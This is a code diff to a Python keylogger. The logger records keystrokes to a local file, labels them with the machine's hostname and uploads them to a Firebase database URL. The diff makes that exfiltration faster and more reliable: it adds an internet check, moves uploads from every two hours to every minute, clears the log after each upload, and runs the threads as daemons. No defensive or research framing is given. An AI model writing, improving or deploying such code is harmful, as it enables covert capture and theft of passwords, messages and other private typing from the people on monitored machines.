@@ -10,8 +10,21 @@ firebase_url = 'https://project-runnner-default-rtdb.firebaseio.com/'
 log_file = "keylog.txt"
 hostname = socket.gethostname()
 
+# Function to check internet availability
+def is_internet_available():
+    try:
+        # Attempt to connect to a public DNS server
+        socket.create_connection(("8.8.8.8", 53), timeout=5)
+        return True
+    except (socket.timeout, socket.error):
+        return False
+
 # Function to upload the log file to Firebase
 def upload_log():
+    if not is_internet_available():
+        print("Internet not available, skipping upload.")
+        return False
+    
     db_path = f'users/{hostname}/{datetime.now().strftime("%Y-%m-%d %H:%M:%S")}.json'
     with open(log_file, 'r') as file:
         file_data = file.read()
@@ -21,19 +34,28 @@ def upload_log():
         response = requests.put(firebase_url + db_path, json=data_to_upload)
         if response.status_code == 200:
             print(f"Uploaded: {log_file}")
-            # Only delete the log file after successful upload
-            with open(log_file, 'w') as file:  # Empty the log file
+            # Clear the log file after successful upload
+            with open(log_file, 'w') as file:
                 file.truncate(0)
+            # Add a mark for the new logging session
+            with open(log_file, 'a') as file:
+                file.write(f"\n--- New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
+            return True
         else:
             print(f"Failed to upload (Status code {response.status_code}): {log_file}")
+            return False
     except requests.exceptions.RequestException as e:
         print(f"Failed to upload {log_file}: {e}")
+        return False
 
-# Function to periodically attempt uploading the log file every 2 hours
+# Function to periodically attempt uploading the log file every 1 minute
 def periodic_upload():
     while True:
-        upload_log()
-        time.sleep(2 * 3600)  # Wait for 2 hours before trying again
+        if upload_log():
+            print("Log file uploaded successfully and cleared.")
+        else:
+            print("Upload failed. Retrying in 1 minute.")
+        time.sleep(60)  # Wait for 1 minute before the next attempt
 
 # Debounce settings for keystrokes
 recent_keys = {}
@@ -72,21 +94,18 @@ def ensure_log_exists():
 if __name__ == "__main__":
     ensure_log_exists()  # Ensure that the log file exists
 
-    # Upload the log file immediately at the start
-    upload_log()
-
     # Add a mark indicating the start of a new logging session
     with open(log_file, 'a') as file:
         file.write(f"\n--- New logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
 
     # Start listener in a separate thread
-    listener_thread = threading.Thread(target=start_listener)
+    listener_thread = threading.Thread(target=start_listener, daemon=True)
     listener_thread.start()
 
     # Start periodic upload in a separate thread
-    upload_thread = threading.Thread(target=periodic_upload)
+    upload_thread = threading.Thread(target=periodic_upload, daemon=True)
     upload_thread.start()
 
-    # Ensure both threads keep running
+    # Keep the main thread running
     listener_thread.join()
     upload_thread.join()
